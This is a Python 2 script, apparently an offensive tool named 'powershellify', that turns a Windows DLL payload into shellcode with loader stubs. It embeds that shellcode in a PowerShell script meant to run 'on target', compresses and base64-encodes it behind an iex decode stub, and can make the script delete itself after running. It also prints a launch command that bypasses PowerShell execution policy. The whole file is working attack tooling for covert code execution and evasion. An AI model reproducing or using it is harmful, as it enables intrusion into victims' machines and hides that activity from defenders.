import sys
import base64
import binascii
import struct
import os
import subprocess
import shlex
import zlib
LINE_LENGTH = 300

def hexify_32(filename):
    try:
        f = open(filename, 'rb')
        data = f.read((1024 * 1024))
        f.close()
        output = ''
        preamble = binascii.unhexlify('68')
        preamble += struct.pack('<I', len(data))
        preamble += binascii.unhexlify('E8000000005883C00B50FFD083C408C3')
        data = ( preamble + data)
        for i in xrange(0, len(data)):
            chunk = data[i:(i + 1)]
            if (i != (len(data) - 1)):
                output += ('0x%s,' % binascii.hexlify(chunk))
            else:
                output += ('0x%s' % binascii.hexlify(chunk))
            if ((i % LINE_LENGTH) == (LINE_LENGTH - 1)):
                output += '\n'
        return output
    except Exception as e:
        raise 

def hexify_64(filename):
    try:
        f = open(filename, 'rb')
        data = f.read((1024 * 1024))
        f.close()
        preamble = binascii.unhexlify('4881EC2800000048BA')
        preamble += struct.pack('<I', len(data))
        preamble += binascii.unhexlify('00000000488D0D0A000000FFD14881C428000000C3')
        data = (preamble + data)
        output = ''
        for i in xrange(0, len(data)):
            chunk = data[i:(i + 1)]
            if (i != (len(data) - 1)):
                output += ('0x%s,' % binascii.hexlify(chunk))
            else:
                output += ('0x%s' % binascii.hexlify(chunk))
            if ((i % LINE_LENGTH) == (LINE_LENGTH - 1)):
                output += '\n'
        return output
    except Exception as e:
        raise 

def create_32_shellcode(filename, ordinal=1):
    corrected_path = os.path.join(filename).replace('\\', '\\\\')
    if (not os.path.exists('makedmgd.exe')):
        print '[-] Failed to generate Shellcode, makedmgd missing'
        sys.exit((-1))
    commandline = shlex.split(('makedmgd.exe %s pc_shellcode.bin 32bit ordinal_finkdifferent_nothread #%d' % (corrected_path, ordinal)))
    p1 = subprocess.call(commandline)
    if (p1 == 0):
        return 'pc_shellcode.bin'
    else:
        raise Exception('[-] Failed to generate Shellcode, makedmgd failed')

def create_64_shellcode(filename, ordinal=1):
    argument = ''
    corrected_path = os.path.join(filename).replace('\\', '\\\\')
    if (not os.path.exists('makedmgd.exe')):
        print '[-] Failed to generate Shellcode, makedmgd.exe missing'
        raise Exception
    commandline = shlex.split(('makedmgd.exe %s pc_shellcode.bin 64bit ordinal_finkdifferent_nothread #%d' % (corrected_path, ordinal)))
    p1 = subprocess.call(commandline)
    if (p1 == 0):
        return 'pc_shellcode.bin'
    else:
        raise Exception('[-] Failed to generate Shellcode, makedmgd.exe failed')

def make_32_script(input_file, output_script, base_script='ps_base.txt', arguments=1):
    target_script = open(output_script, 'w')
    print '[+] Creating shellcode file with makedmgd'
    shellcode_file = create_32_shellcode(input_file, ordinal=arguments)
    print ('[+] Created %s shellcode file' % shellcode_file)
    shellcode = hexify_32(shellcode_file)
    print ('[+] Deleted %s' % shellcode_file)
    os.remove(shellcode_file)
    powershell_script = open(base_script, 'rb')
    print '[+] Creating Powershell script to be run on target'
    for line in powershell_script:
        if (line.find('[Byte[]] $Instructions32 = @()') > (-1)):
            target_script.write(('[Byte[]] $Instructions32 = @(%s)\n' % shellcode))
        else:
            target_script.write((line.strip() + '\n'))
    target_script.close()
    powershell_script.close()

def make_64_script(input_file, output_script, base_script='ps_base.txt', arguments=1):
    target_script = open(output_script, 'w')
    print '[+] Creating shellcode file with fdloader'
    shellcode_file = create_64_shellcode(input_file, ordinal=arguments)
    print ('[+] Created %s shellcode file' % shellcode_file)
    shellcode = hexify_64(shellcode_file)
    print ('[+] Deleted %s' % shellcode_file)
    os.remove(shellcode_file)
    powershell_script = open(base_script, 'rb')
    print '[+] Creating Powershell script to be run on target'
    for line in powershell_script:
        if (line.find('[Byte[]] $Instructions64 = @()') > (-1)):
            target_script.write(('[Byte[]] $Instructions64 = @(%s)\n' % shellcode))
        else:
            target_script.write((line.strip() + '\n'))
    target_script.close()
    powershell_script.close()

def is_payload_64(filename):
    try:
        dll_file = open(filename, 'rb')
        dos_header = dll_file.read(64)
        (magic,) = struct.unpack('2s', dos_header[:2])
        (offset,) = struct.unpack('<l', dos_header[(-4):])
        if (not (magic == 'MZ')):
            raise Exception('[-] Did not find MZ in Magic field, file is not an exe or dll')
        else:
            print '[+] Detected PE MAGIC'
        dll_file.seek(offset)
        pe_header = dll_file.read(6)
    except Exception:
        raise 
    (machine,) = struct.unpack('<H', pe_header[(-2):])
    if (machine == 34404):
        print ('[-] 64 Bit machine: %s' % hex(machine))
        print '[+] Payload is 64bit'
        return True
    elif (machine == 332):
        print ('[-] 32 Bit machine: %s' % hex(machine))
        print '[+] Payload is i386'
        return False
    else:
        raise Exception(('[-] Unknown machine: %s' % hex(machine)))

def usage():
    print '======================  USAGE  ============================'
    print 'powershellify.py PC_DLL SCRIPT_TO_GENERATE'
    print '==========================================================='

def make_compressed_script(input_file, output_script, base_script=None, ordinal=1, standalone=False):
    powershell_stub = '$h = [Convert]::FromBase64String($a);\n$mz = New-Object System.IO.MemoryStream($h, $True);\n$mz.readbyte() | out-null;\n$mz.readbyte() | out-null;\n$zp = New-Object IO.Compression.DeflateStream($mz, [System.IO.Compression.CompressionMode]::Decompress);\n$sw = New-Object IO.StreamReader($zp);\n$ud = $sw.Readtoend();\n$sw.Close();\n$zp.close();\n$mz.close();\n'
    my_path = os.path.realpath(__file__)
    os.chdir(os.path.dirname(my_path))
    if (type(input_file) == str):
        if (not os.path.exists(input_file)):
            raise Exception(('[-] %s does not exist' % input_file))
        if is_payload_64(input_file):
            make_64_script(input_file, (output_script + '.tmp'), arguments=ordinal)
        else:
            make_32_script(input_file, (output_script + '.tmp'), arguments=ordinal)
    elif (type(input_file) == list):
        if (len(input_file) != 2):
            raise Exception('[-] Can only have two payloads in a script file')
        for file_name in input_file:
            if (not os.path.exists(file_name)):
                raise Exception(('[-] %s does not exist' % file_name))
        index_of_64_payload = 0
        index_of_32_payload = 0
        for (index, file_name) in enumerate(input_file):
            if is_payload_64(file_name):
                index_of_64_payload += (index + 1)
            else:
                index_of_32_payload += (index + 1)
        if ((index_of_64_payload == 0) or (index_of_64_payload == 3)):
            raise Exception('[-] Can only process two scripts of different architectures')
        make_32_script(input_file[(index_of_32_payload - 1)], (output_script + '32.tmp'), arguments=ordinal)
        make_64_script(input_file[(index_of_64_payload - 1)], (output_script + '.tmp'), base_script=(output_script + '32.tmp'), arguments=ordinal)
        os.remove((output_script + '32.tmp'))
    target_script = open(output_script, 'wb')
    data = zlib.compress(open((output_script + '.tmp'), 'r').read())
    b64_data = base64.b64encode(data)
    length = LINE_LENGTH
    target_script.write(('$a = "%s";\n' % b64_data[:length]))
    for index in range(length, len(b64_data), length):
        if ((index + length) <= len(b64_data)):
            target_script.write(('$a += "%s";\n' % b64_data[index:(index + length)]))
        else:
            target_script.write(('$a += "%s";\n' % b64_data[index:]))
    target_script.write(powershell_stub)
    if standalone:
        target_script.write('Remove-Item $MyInvocation.MyCommand.Definition;\n')
    target_script.write('iex $ud;\n')
    target_script.close()
    os.remove((output_script + '.tmp'))

def print_help():
    print '==================   EXECUTE USING COMMAND   =============================\n'
    print 'c:\\windows\\system32\\WindowsPowershell\\v1.0\\powershell.exe -ExecutionPolicy bypass -nologo -noninteractive -noprofile \\PATH\\TO\\SCRIPT'
    print '\n==================   EXECUTE USING COMMAND   ==========================='
if (__name__ == '__main__'):
    if (len(sys.argv) != 3):
        usage()
        sys.exit((-1))
    my_path = os.path.realpath(__file__)
    os.chdir(os.path.dirname(my_path))
    try:
        make_compressed_script(sys.argv[1], sys.argv[2], standalone=True)
    except:
        sys.exit((-1))
    print_help()

